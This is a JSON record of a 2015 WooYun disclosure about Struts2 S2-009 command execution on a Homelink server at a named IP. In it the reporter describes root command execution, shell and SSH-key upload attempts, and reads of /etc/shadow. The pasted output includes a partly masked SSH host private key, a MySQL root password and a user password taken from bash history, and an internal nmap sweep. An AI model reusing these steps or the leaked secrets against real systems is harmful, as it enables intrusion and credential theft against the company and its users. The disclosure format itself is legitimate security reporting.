{"id": 70682, "wybug_id": "wooyun-2015-0134544", "wybug_title": "链家某站struct2命令执行", "wybug_corp": "homelink.com.cn", "wybug_author": "xk0n", "wybug_date": "2015-08-17 11:21", "wybug_open_date": "2015-10-02 11:08", "wybug_type": "命令执行", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程命令执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-02：\t细节向公众公开  简要描述： 链家某站struct2命令执行，可获取重要信息 详细说明：  存在的站为http://42.159.27.54/view_initIndexPageForCustomer.action\nTarget: http://42.159.27.54/view_initIndexPageForCustomer.actionUseage: S2-009 Whoami: rootWebPath: /usr/local/tomcat7/webapps/homelink/\n可以上传shell但是没有执行权限，而且chmod也没用，无奈。。转而上传ssh公钥，但是还是不能登陆，估计是要更改/etc/ssh/sshd_config，后来发现在/etc/ssh/下有公私玥的，但是我无意中把22端口干掉了。。。（><）\n★K8cmd-> ls -l /etc/ssh/====================================================================================================================================total 160-rw-------. 1 root root 125811 Nov 13  2014 moduli-rw-r--r--. 1 root root   2047 Nov 13  2014 ssh_config-rw-------  1 root root   3886 Aug  6 17:21 sshd_config-rw-------. 1 root root   3880 Jul  2 17:15 sshd_config.20150702-rw-------. 1 root root    668 Feb  9  2015 ssh_host_dsa_key-rw-r--r--. 1 root root    590 Feb  9  2015 ssh_host_dsa_key.pub-rw-------. 1 root root    963 Feb  9  2015 ssh_host_key-rw-r--r--. 1 root root    627 Feb  9  2015 ssh_host_key.pub-rw-------. 1 root root   1675 Feb  9  2015 ssh_host_rsa_key-rw-r--r--. 1 root root    408 Feb  9  2015 ssh_host_rsa_key.pub====================================================================================================================================★K8cmd-> cat /etc/ssh/ssh_host_rsa_key====================================================================================================================================-----BEGIN RSA PRIVATE KEY-----MIIEogIBAAKCAQEAwnjauhVy/wnS7lMbk8KAnSkQxm1x+7LrdfSUFGvcn6b6jwfp0OX89lQFGZ9GjJiU7gQ/Y6gcEKyYzx5n7xburk63b/er8D8Re7Y9p9HV+MYGAC0Gv8gY0zbcyDLFRlsJLWxgIhRvtY716cyrtO5oGDv4YpKhRPNKTUntrzcY899HhVe8QY2sBIbhyq4iygzk57C73gMj+/WZ2Xxz9soxfZE2a7wIBkSZ40KRxNTfnLGi4ysixXHYm7tSxUlhWPVvlLNWZX7EPOxLePvSyeyu0fGk5Egva/qTE+Ikvqt3njiRdN6MUcyr+7ymWDtJnfb6hL06B+rwvSEZSBVixhoJ5wIBIwKCAQEAlgV1iDxup3ybZ2Su37NNRgm8e9DFpOkcCol5jBixgnl/dacE1Fml4piWOFZMXdTKqPv2YtIkR2CTI286PBkBRKMfy2dKH7ufxdW6iMZx3SsL8YHSAaj9NTjzdd4F5dEy9ye338afUYuKgSjcOx5QTTWTucGSWcL+zeiSyP6eOHeywx7SbgGh1g+15Tn0C2lVzb91yXOgmRXJGJ1lO7LcSwRCuqOJmrMePyuk3/hgGXD+zPsvkQzggiaySO0nLDCGzYcJAtR80zBlO3ndMaObHuA9oduvfaD/0HGdu0k7O69/23jaAYrfgwkbBicxeM0rXd4p4dCVenYWTEHr/iYrcwKBgQDoOWrFiAPP8E2E2aMhal3SKOEaQd4aAYkhWvHa4qEuguh9BSUd+RKjrHFoGDB8MfVDTw7LA9B+aoEre1CiN5G3LisRBE2ygyvCnvpc+czFLrLQKW7ddb7OQpNqhCI7xWCDoiPsj+lWej1QQOZtP7ucJk6ZhzAe51u7XnqvgegXJQKBgQDWYfRqr62ref8SVh6yDoVXqp6Nqfdyrz1EaB1hs89grGDUrYoIRKiWHdF536TKZjNhIhkaGJCo8M8aQMVTdlQ5EEGFjO43Bs2mz0cLOnHBvZdoZErDzqP0d0AwIdT4i3lLo0Pj+McEXGCR3/KluCftQ5EB6jqnxT9BAgLgKiZlGwKBgDu2/jLLNC4n2WtN6B6JEM+kHKBaFIpYKpOMahO2nnmsoi7Gzwe1E2vqg4/LtLI4u2kUVELVGFsFcawYZTEG+ZWA5oC39rjf5q5jZPNWLVdGhcB/rss7iNXz3MOeUfIcz6zR6/sAbzN+hMt+ZyNoKO2jc0wM0dwPmz7PJtysYEB3AoGBAMQByYYc9o4mZY0bicddu73d0sqqBs9BIhKoVWCkZdS63DAposW7HcsT8riR9cBdcM3WCFJfmjQPXkPjcpVzgDQsHqX9MZFlTk9ebNcQ3Qjn2uMZ3fTaL4BtB3x2tBZw4+1iEi+EXi/fbjw6d3Lxg5cZNB8CCb32KzQfGJJvrhNLAoGAMLpsrZuRHxJQr9r9YdLnRIFCbtcEmdzn+w95bB8PNJSB2uTtHSlsWi9DCXkDzhMIjknZnQORJD/tjnH8SYnVr304DqHqHhfGxtpE1bUhXVy/cB8Rk/SSfxTzzXhTLutBaR3JtQ5HjGIX5heKdLX/T5EtFr************************-----END RSA PRIVATE KEY-----====================================================================================================================================\n但是可以拿到/etc/passwd 和/etc/shadow，本地破解登陆密码，但是字典不给力。。。但是还是能够读到各种信息，而且nmap可以用扫内网/root/.bash_history中可以看到数据库密码：\n/usr/local/mysql/bin/mysqladmin -uroot password 'homelink'\n还有kevin的\n***************#1435828548echo \"e0GNnsFG234gFpgI945gfBfergGe453BCvbr8\" |passwd --stdin kevin*************\n\n★K8cmd-> cat /tmp/test====================================================================================================================================# Nmap 5.51 scan initiated Sun Aug 16 19:51:51 2015 as: nmap -sP -oN /tmp/test 10.20.7.1/16Nmap scan report for 10.20.0.4Host is up (0.13s latency).Nmap scan report for 10.20.0.5Host is up (0.012s latency).Nmap scan report for 10.20.5.5Host is up (0.00090s latency).Nmap scan report for 10.20.5.6Host is up (0.00072s latency).Nmap scan report for 10.20.5.7Host is up (0.0011s latency).Nmap scan report for 10.20.5.9Host is up (0.00099s latency).Nmap scan report for 10.20.5.10Host is up (0.00063s latency).Nmap scan report for 10.20.5.11Host is up (0.00076s latency).Nmap scan report for 10.20.5.12Host is up (0.00076s latency).Nmap scan report for 10.20.5.14Host is up (0.00086s latency).Nmap scan report for 10.20.6.1Host is up (0.012s latency).MAC Address: 12:34:56:78:9A:BC (Unknown)Nmap scan report for 10.20.6.4Host is up (0.053s latency).MAC Address: 12:34:56:78:9A:BC (Unknown)Nmap scan report for 10.20.6.5Host is up (0.013s latency).MAC Address: 12:34:56:78:9A:BC (Unknown)Nmap scan report for hl-az-hrrecrup (10.20.6.7)Host is up.Nmap scan report for 10.20.6.8Host is up (0.11s latency).MAC Address: 12:34:56:78:9A:BC (Unknown)Nmap scan report for 10.20.6.9Host is up (0.13s latency).MAC Address: 12:34:56:78:9A:BC (Unknown)Nmap scan report for 10.20.6.10Host is up (0.13s latency).MAC Address: 12:34:56:78:9A:BC (Unknown)=======================================================================================================================\n能力有多大就走的有多深，小菜暂时到这里了最后我把我测试写的一些文件都删了，除了/usr/local/tomcat7/webapps/下有两个jsp和一个test，我好像删不了。。。   漏洞证明：  见详情   修复方案：  升级吧   版权声明：转载请注明来源 xk0n@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-08-18 11:07 厂商回复： 多谢 路人甲 提交的漏洞，我们会尽快积极处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}